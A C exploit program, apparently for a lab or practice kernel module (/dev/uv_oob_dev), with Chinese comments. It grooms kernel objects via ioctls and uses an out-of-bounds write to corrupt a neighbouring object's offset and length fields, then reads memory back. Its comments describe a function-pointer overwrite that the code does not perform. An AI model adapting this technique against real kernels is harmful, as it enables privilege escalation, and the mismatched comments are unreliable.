#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/uv_oob_dev"

#define IOCTL_MAGIC 'Y'
#define IOCTL_ALLOC_VULN _IOWR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_FREE_VULN _IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_WRITE_VULN _IOW(IOCTL_MAGIC, 0x03, int)
#define IOCTL_READ_VULN _IOR(IOCTL_MAGIC, 0x04, int)
#define IOCTL_ALLOC_ELS _IOWR(IOCTL_MAGIC, 0x05, int)
#define IOCTL_FREE_ELS _IOW(IOCTL_MAGIC, 0x06, int)
#define IOCTL_WRITE_ELS _IOW(IOCTL_MAGIC, 0x07, int)
#define IOCTL_READ_ELS _IOR(IOCTL_MAGIC, 0x08, int)
#define IOCTL_ALLOC_VICTIM _IOWR(IOCTL_MAGIC, 0x09, int)
#define IOCTL_FREE_VICTIM _IOW(IOCTL_MAGIC, 0x0A, int)
#define IOCTL_WRITE_VICTIM _IOW(IOCTL_MAGIC, 0x0B, int)
#define IOCTL_READ_VICTIM _IOR(IOCTL_MAGIC, 0x0C, int)
#define IOCTL_EXECUTE_VICTIM _IOW(IOCTL_MAGIC, 0x0D, int)
struct request_arg {
  int handler;
  int offset;
  int length;
  char *value;
};

int main() {
  int fd;
  int oob_handler;
  int victim_handler;
  int els_handler;
  struct request_arg req;

  printf("[*] Kernel OOB Exploit\n");

  // 1. 打开设备
  fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("[-] Failed to open the device");
    return -1;
  }
  printf("[+] Device opened successfully.\n");

  if (ioctl(fd, IOCTL_ALLOC_VICTIM, &victim_handler) < 0) {
    perror("[-] Failed to allocate victim");
    close(fd);
    return -1;
  }
  printf("[+] Allocated victim with handler: %d\n", victim_handler);

  char dummy_buf[] = "deadbeef";
  req.handler = victim_handler;
  req.offset = 0;
  req.length = sizeof(dummy_buf);
  req.value = dummy_buf;
  if (ioctl(fd, IOCTL_WRITE_VICTIM, &req) < 0) {
    perror("[-] Failed to write to victim");
    close(fd);
    return -1;
  }

  if (ioctl(fd, IOCTL_ALLOC_ELS, &els_handler) < 0) {
    perror("[-] Failed to allocate els");
    close(fd);
    return -1;
  }
  printf("[+] Allocated els with handler: %d\n", els_handler);

  // 2. 通过 IOCTL_ALLOC_VULN 分配 oob 对象，获取 handler
  if (ioctl(fd, IOCTL_ALLOC_VULN, &oob_handler) < 0) {
    perror("[-] Failed to allocate vuln");
    close(fd);
    return -1;
  }
  printf("[+] Allocated vuln with handler: %d\n", oob_handler);

  // 4. 利用 OOB WRITE 覆盖 buffer (128 bytes) 之后的函数指针
  // 这里需要把 bad_function 的地址值写进目标函数指针字段，
  // 而不是把 bad_func_addr 当成 memcpy 的源地址。
  printf("[+] Overwriting funptr with bad_function address...\n");
  int offset = 520, length = sizeof(dummy_buf);
  req.handler = oob_handler;
  req.offset = 520;
  req.length = sizeof(int);
  req.value = (char *)&offset;
  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to OOB write");
    close(fd);
    return -1;
  }
  req.offset = 524;
  req.value = (char *)&length;
  if (ioctl(fd, IOCTL_WRITE_VULN, &req) < 0) {
    perror("[-] Failed to OOB write");
    close(fd);
    return -1;
  }
  printf("[+] Overwrite done.\n");

  char read_buf[512];
  req.handler = els_handler;
  req.value = read_buf;
  if (ioctl(fd, IOCTL_READ_ELS, &req) < 0) {
    perror("[-] Failed to read els");
    close(fd);
    return -1;
  }
  printf("[+] Read els buffer: %.*s\n", req.length, req.value);

  if (ioctl(fd, IOCTL_FREE_VICTIM, &victim_handler) < 0) {
    perror("[-] Failed to free victim");
  }
  if (ioctl(fd, IOCTL_FREE_ELS, &els_handler) < 0) {
    perror("[-] Failed to free els");
  }
  if (ioctl(fd, IOCTL_FREE_VULN, &oob_handler) < 0) {
    perror("[-] Failed to free vuln");
  }

  close(fd);
  return 0;
}
